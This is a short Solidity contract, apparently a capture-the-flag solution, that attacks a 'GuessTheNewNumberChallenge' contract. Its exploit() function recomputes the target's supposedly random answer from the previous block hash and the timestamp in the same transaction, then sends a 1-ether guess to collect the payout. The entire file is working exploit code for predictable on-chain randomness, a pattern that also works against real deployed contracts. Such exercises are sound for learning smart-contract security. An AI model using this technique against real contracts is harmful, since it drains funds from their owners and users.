pragma solidity ^0.4.21;

import '../GuessTheNewNumberChallenge.sol';

contract hackingGuessTheNewNumberChallenge {
    GuessTheNewNumberChallenge public original;
    uint8 answer;

    function hackingGuessTheNewNumberChallenge(address _contractAddress) public payable {
        original = GuessTheNewNumberChallenge(_contractAddress);
    }

    function exploit() external payable {
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        original.guess.value(1 ether)(answer);
    }

    function() external payable {}
}